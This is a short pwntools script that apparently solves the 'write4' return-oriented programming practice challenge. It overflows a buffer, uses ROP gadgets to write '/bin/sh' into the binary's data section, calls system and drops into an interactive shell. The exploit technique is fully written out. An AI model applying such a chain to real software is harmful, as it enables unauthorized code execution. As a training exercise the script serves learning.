from pwn import *
import angr, angrop

prog = process("./write4")
# p = angr.Project("write4")

# rop = p.analyses.ROP()
# rop.find_gadgets()

system_call = p64(0x00400810)

payload = "A" * 40

payload += p64(0x400890)    # pop r14; pop r15; ret
payload += p64(0x00601050)  # address in data
payload += ("/bin/sh\0")
payload += p64(0x400820)    # mov qword ptr [r14], r15; ret
payload += p64(0x400893)    # pop rdi; ret
payload += p64(0x00601050)  # our address in data
payload += system_call

open('payload', 'w').write(payload)

print prog.recvuntil(">")
prog.clean()

prog.sendline(payload)

prog.interactive()
